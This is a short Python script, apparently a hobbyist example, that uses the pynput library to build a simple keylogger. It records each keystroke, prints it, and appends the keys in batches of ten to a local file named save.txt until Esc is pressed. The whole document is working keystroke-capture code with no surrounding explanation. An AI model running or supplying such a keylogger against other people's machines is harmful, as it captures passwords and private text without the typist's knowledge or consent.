
import pynput
from pynput.keyboard import Key, Listener

count = 0
keys = []

def press(key):
    global keys, count
    keys.append(key)
    count += 1
    print(key)
    if count >= 10:
        count = 0
        save(keys)
        keys = []

def save(keys):
    with open("save.txt", "a") as file:
        for key in keys:
            _key = str(key).replace("'","")
            if _key.find("space") > 0:
                file.write("\n")
            elif _key.find("key") == -1:
                file.write(_key)

def release(key):
    if key == Key.esc:
        return False

with Listener(on_press=press, on_release=release) as listener:
    listener.join()

